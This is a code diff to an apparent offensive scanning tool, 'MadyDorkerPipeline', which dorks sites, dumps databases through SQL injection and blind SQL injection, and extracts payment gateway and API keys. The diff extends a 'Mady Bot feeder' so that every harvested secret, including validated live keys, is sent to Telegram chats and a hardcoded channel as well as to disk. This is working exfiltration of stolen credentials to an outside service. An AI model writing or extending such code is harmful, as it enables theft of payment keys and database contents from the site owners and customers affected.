@@ -88,7 +88,7 @@ from key_validator import KeyValidator, KeyValidation
 from ml_filter import MLFilter, FilterResult
 from js_analyzer import JSBundleAnalyzer, JSAnalysisResult, analyze_js_bundles
 from api_bruteforcer import APIBruteforcer, BruteforceResult, bruteforce_api
-from mady_feeder import MadyFeeder, MadyFeederConfig, feed_to_mady, get_feeder
+from mady_feeder import MadyFeeder, MadyFeederConfig, feed_to_mady, feed_to_mady_async, get_feeder
 from subdomain_enum import SubdomainEnumerator, SubdomainResult, enumerate_subdomains
 from dir_fuzzer import DirectoryFuzzer, DirFuzzResult, fuzz_directories
 from hint_engine import (
@@ -348,15 +348,27 @@ class MadyDorkerPipeline:
             self.dump_parser = DumpParser()  # Standalone dump parser for external files
             logger.info("📦 Auto Dumper v1.0 enabled (inject → dump → parse → report pipeline)")
         
-        # Mady Bot Feeder — auto-feed gateway keys to Mady bot (v3.21)
+        # Mady Bot Feeder — auto-feed gateway keys to Mady bot (v3.22 — disk + Telegram)
         self.mady_feeder = None
         if getattr(self.config, 'mady_bot_feed', True):
             try:
+                # Build Telegram feed targets list
+                feed_chat_ids = []
+                if self.config.telegram_chat_id:
+                    feed_chat_ids.append(self.config.telegram_chat_id)
+                if self.config.telegram_group_id:
+                    feed_chat_ids.append(self.config.telegram_group_id)
+                
                 self.mady_feeder = MadyFeeder(MadyFeederConfig(
                     enabled=True,
                     mady_path=getattr(self.config, 'mady_bot_path', '/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0'),
+                    telegram_enabled=True,
+                    bot_token=self.config.telegram_bot_token,
+                    feed_chat_ids=feed_chat_ids,
+                    mady_bot_chat_id=getattr(self.config, 'mady_bot_chat_id', '8385066318'),
+                    feed_channel_id=getattr(self.config, 'mady_feed_channel_id', '-1003720958643'),
                 ))
-                logger.info("🤖 Mady Bot feeder enabled (50+ gateway types)")
+                logger.info("🤖 Mady Bot feeder enabled (50+ gateways, disk + Telegram rich messages)")
             except Exception as e:
                 logger.warning(f"Mady Bot feeder init failed: {e}")
         
@@ -934,12 +946,13 @@ class MadyDorkerPipeline:
                                         url, secret.type, secret.value,
                                         {"confidence": secret.confidence}
                                     )
-                                    # Auto-feed to Mady bot
+                                    # Auto-feed to Mady bot (disk + Telegram)
                                     if self.mady_feeder:
                                         try:
                                             fed = self.mady_feeder.feed_gateway(
                                                 url, secret.type, secret.value,
-                                                extra={"confidence": secret.confidence, "source": "secret_extraction"},
+                                                extra={"confidence": secret.confidence},
+                                                source="gateway_secrets",
                                             )
                                             if fed:
                                                 result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -968,7 +981,8 @@ class MadyDorkerPipeline:
                                         try:
                                             fed = self.mady_feeder.feed_gateway(
                                                 url, secret.type, secret.value,
-                                                extra={"confidence": secret.confidence, "source": "secret_extraction", "category": secret.category},
+                                                extra={"confidence": secret.confidence, "category": secret.category},
+                                                source="api_secrets",
                                             )
                                             if fed:
                                                 result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -1052,7 +1066,8 @@ class MadyDorkerPipeline:
                                         try:
                                             fed = self.mady_feeder.feed_gateway(
                                                 url, secret_obj_type, secret_val,
-                                                extra={"confidence": secret_conf, "source": "js_bundle"},
+                                                extra={"confidence": secret_conf},
+                                                source="js_bundle",
                                             )
                                             if fed:
                                                 result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -1307,7 +1322,7 @@ class MadyDorkerPipeline:
                                                         fed = self.mady_feeder.feed_gateway(
                                                             url, key_entry.get("type", "db_key"),
                                                             key_entry.get("value", ""),
-                                                            extra={"source": f"auto_dump_{parsed.source}"},
+                                                            source="auto_dump_gateway",
                                                         )
                                                         if fed:
                                                             result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -1327,7 +1342,7 @@ class MadyDorkerPipeline:
                                                         fed = self.mady_feeder.feed_gateway(
                                                             url, vk.get("type", "validated_key"),
                                                             vk.get("value", ""),
-                                                            extra={"source": "auto_dump_validated"},
+                                                            source="auto_dump_valid",
                                                         )
                                                         if fed:
                                                             result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -1568,7 +1583,8 @@ class MadyDorkerPipeline:
                                                 try:
                                                     fed = self.mady_feeder.feed_gateway(
                                                         url, v.key_type, v.display_key,
-                                                        extra={"source": "key_validation", "is_live": True, "risk": v.risk_level},
+                                                        extra={"is_live": True, "risk": v.risk_level},
+                                                        source="key_validation",
                                                     )
                                                     if fed:
                                                         result["mady_fed"] = result.get("mady_fed", 0) + 1
@@ -3873,7 +3889,7 @@ async def _do_scan(update: Update, url: str):
                                                     # Feed to Mady bot
                                                     if p.mady_feeder:
                                                         try:
-                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, extra={"source": "sqli_dump_scan"})
+                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, source="scan_sqli_dump")
                                                         except Exception:
                                                             pass
                                         
@@ -3973,7 +3989,7 @@ async def _do_scan(update: Update, url: str):
                                                     # Feed to Mady bot
                                                     if p.mady_feeder:
                                                         try:
-                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, extra={"source": "blind_sqli_dump_scan"})
+                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, source="scan_blind_dump")
                                                         except Exception:
                                                             pass
                                         
@@ -4038,7 +4054,8 @@ async def _do_scan(update: Update, url: str):
                 try:
                     p.mady_feeder.feed_gateway(
                         secret.url, secret.type, secret.value,
-                        extra={"confidence": secret.confidence, "source": "scan_command"},
+                        extra={"confidence": secret.confidence},
+                        source="scan_gateway_report",
                     )
                 except Exception:
                     pass
@@ -4047,7 +4064,8 @@ async def _do_scan(update: Update, url: str):
             try:
                 p.mady_feeder.feed_gateway(
                     secret.url, secret.type, secret.value,
-                    extra={"confidence": secret.confidence, "source": "scan_command", "category": secret.category},
+                    extra={"confidence": secret.confidence, "category": secret.category},
+                    source="scan_non_gateway",
                 )
             except Exception:
                 pass
